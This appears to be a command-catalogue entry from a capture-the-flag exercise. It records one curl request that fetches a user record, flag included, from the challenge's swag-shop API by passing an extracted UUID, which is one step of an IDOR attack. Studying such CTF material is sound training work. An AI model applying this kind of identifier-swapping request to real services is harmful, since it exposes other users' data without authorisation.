---
id: cmd-uuid-6
data: >-
  curl
  https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
tags:
  - api
type: command
output: User JSON with flag.
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:55.466Z'
verified: false
validated: true
submitted: true
---
# Curl Retrieve User Uuid

## Command

```bash
curl https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
```

## Description

Retrieves user data using extracted UUID.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| uuid | User identifier | Yes |

## Examples

### Basic Usage

```bash
curl api/user?uuid=abc
```

## Expected Output

JSON including flag.

## Related

- [[procedures/Fuzz-API-Endpoints-and-Extract-UUID-for-IDOR]]
